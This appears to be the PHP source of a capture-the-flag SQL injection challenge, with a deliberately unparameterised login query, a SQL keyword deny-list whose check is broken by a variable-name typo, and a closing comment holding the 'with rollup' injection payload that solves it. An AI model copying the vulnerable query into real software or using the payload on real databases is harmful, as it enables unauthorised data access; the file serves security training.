<?php
include 'global.php';

function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if(is_array($StrValue))
    {
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrtValue)==1){   
        print "holy shit!";
        exit();
    }      
} 

$filter = "union|select|from|where|join|sleep|benchmark|,|\(|\)";

foreach($_POST as $key=>$value){ 
    AttackFilter($key,$value,$filter);
}


if(!isset($_POST['key1']) || !isset($_POST['key2'])) {
    print <<<DBAPP

<img src='image/img.jpg' />
<!--index.phps-->
DBAPP;
    die;
}



$query = mysql_query("SELECT * FROM tb_ctf WHERE key1 = '{$_POST['key1']}'"); 
if(mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['key2'] == $_POST['key2']) {
        print $flag;
    }else{
        print "Error!";
        }
}else{
    print "Error!";
}


#key1=' or 1=1 group by  key2 with rollup limit 1 offset 1# &key2=